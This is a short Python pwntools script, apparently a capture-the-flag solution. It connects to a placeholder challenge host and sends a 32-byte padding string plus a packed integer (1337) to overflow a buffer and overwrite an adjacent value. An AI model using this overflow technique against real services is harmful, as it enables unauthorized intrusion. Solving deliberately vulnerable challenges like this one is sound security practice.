from pwn import *
import struct

TARGET_HOST = 'xxx.vuln.gg'
TARGET_PORT = 443

context.log_level = "debug"
io = remote(TARGET_HOST, TARGET_PORT, ssl=True)
payload = b"a" * 32 + struct.pack("i", 1337)

io.sendlineafter(b"What do I want to eat?\n", payload)
print(io.recv().decode())
